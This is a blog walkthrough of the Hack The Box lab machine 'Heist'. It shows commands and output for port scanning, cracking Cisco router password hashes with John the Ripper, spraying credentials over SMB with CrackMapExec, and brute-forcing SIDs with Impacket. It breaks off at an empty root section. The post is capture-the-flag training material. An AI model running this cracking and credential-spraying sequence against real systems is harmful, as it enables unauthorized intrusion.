---
layout: post
title: Hackthebox Heist Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-12-01/heist-badge.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box "Heist".<br>

# Solution
### 1. Initial Enumeration

#### TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.149 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-30 16:11 EET
Nmap scan report for 10.10.10.149
Host is up (0.043s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49668/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 52s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-11-30T14:15:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 258.38 seconds

root@kali:~#
{% endhighlight %}

#### SMB enumeration:
{% highlight shell %}
root@kali:~# smbclient -L 10.10.10.149
Enter WORKGROUP\root's password: 
session setup failed: NT_STATUS_ACCESS_DENIED
{% endhighlight %}

#### Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.149/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php -s '200,204,301,302,403'
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.149/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php
[+] Timeout:        10s
===============================================================
2019/11/30 16:29:19 Starting gobuster
===============================================================
/index.php (Status: 302)
/images (Status: 301)
/login.php (Status: 200)
/Images (Status: 301)
/issues.php (Status: 302)
/css (Status: 301)
/Index.php (Status: 302)
/Login.php (Status: 200)
/js (Status: 301)
/Issues.php (Status: 302)
/attachments (Status: 301)
/IMAGES (Status: 301)
/INDEX.php (Status: 302)
/CSS (Status: 301)
/JS (Status: 301)
/Attachments (Status: 301)
[ERROR] 2019/11/30 17:22:44 [!] Get http://10.10.10.149/h_travel2.html: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/LogIn.php (Status: 200)
/LOGIN.php (Status: 200)
===============================================================
2019/11/30 17:53:44 Finished
===============================================================
{% endhighlight %}


### 2. Getting User

On the port 80, we can find a login console.<br>
We don't have any credential yet but we can login as a guest.'
![placeholder](https://inar1.github.io/public/images/2019-12-01/heist-badge.png)

Then, we can see the following messages.<br>
One of the post has an attachment that is a config file of cisco router.
![placeholder](https://inar1.github.io/public/images/2019-12-01/heist-badge.png)
{% highlight shell %}
root@kali:~# curl http://10.10.10.149/attachments/config.txt
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0 mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh

root@kali:~# 
{% endhighlight %}

We found 3 password hashes.<br>
Cisco type 5 is MD5 and type 7 is something Cisco original.
{% highlight shell %}
$1$pdQG$o8nrSzsGXeaduXrjlvKc91
0242114B0E143F015F5D1E161713
02375012182C1A1D751618034F36415408
{% endhighlight %}

We can crack the MD5 hash and achieve the password "stealth1agent" with John the Ripper.
{% highlight shell %}
root@kali:~# cat cisco5.hash 
$1$pdQG$o8nrSzsGXeaduXrjlvKc91

root@kali:~#
{% endhighlight %}
{% highlight shell %}
root@kali:~# john cisco5.hash --wordlist=/usr/share/wordlists/rockyou.txt    
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)
1g 0:00:00:15 DONE (2019-11-30 19:56) 0.06561g/s 230047p/s 230047c/s 230047C/s stealthy001..stcroix85
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@kali:~#
{% endhighlight %}

Next, crack the Cisco type 7 hashes.
We can use <a href="https://passwordrecovery.io/cisco/">this website</a> for that purpose and achieve following 2 passwords.
{% highlight shell %}
$uperP@ssword
Q4)sJu\Y8qz*A3?d
*{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-12-01/heist-badge.png)
![placeholder](https://inar1.github.io/public/images/2019-12-01/heist-badge.png)

Now we have the following users from "issues.php" and passwords from "/attachment/config.txt".<br>
Then, try each pattern for SMB login with <a href="https://github.com/byt3bl33d3r/CrackMapExec.git">CrackMapExec</a>.
{% highlight shell %}
root@kali:~# cat users.txt 
Hazard
Administrator

root@kali:~#
{% endhighlight %}
{% highlight shell %}
root@kali:~# cat passwords.txt 
stealth1agent
$uperP@ssword
Q4)sJu\Y8qz*A3?d

root@kali:~#
{% endhighlight %}
{% highlight shell %}
root@kali:~# apt-get install crackmapexec

---

root@kali:~# crackmapexec smb 10.10.10.149 -u users.txt -p passwords.txt 
[*] First time use detected
[*] Creating home directory structure
[*] Initializing the database
[*] Copying default configuration file
[*] Generating SSL certificate
CME          10.10.10.149:445 SUPPORTDESK     [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SUPPORTDESK)
CME          10.10.10.149:445 SUPPORTDESK     [+] SUPPORTDESK\Hazard:stealth1agent 
[*] KTHXBYE!

root@kali:~#
{% endhighlight %}

Now CME found valid credential for domain "SUPPOETDESK".
{% highlight shell %}
Hazard:stealth1agent
{% endhighlight %}

Then, try to obtain a remote access.<br>
Psexec is not available here because we don't have any SMB share we have write permission.
{% highlight shell %}
root@kali:~# python impacket/examples/psexec.py hazard@10.10.10.149
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.149.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

root@kali:~#
{% endhighlight %}
{% highlight shell %}
root@kali:~# smbmap -H 10.10.10.149 -u hazard -p stealth1agent
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.149...
[+] IP: 10.10.10.149:445	Name: 10.10.10.149                                      
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY

root@kali:~#
*{% endhighlight %}

Next, try to enumerate via on MSRPC port 5985<br>
With a script in the package "<a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>", we can bruteforce the SID of Windows host.
{% highlight shell %}
root@kali:~# python impacket/examples/lookupsid.py hazard:stealth1agent@10.10.10.149
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)

root@kali:~# 
{% endhighlight %}
{% highlight shell %}

{% endhighlight %}

### 3. Getting Root


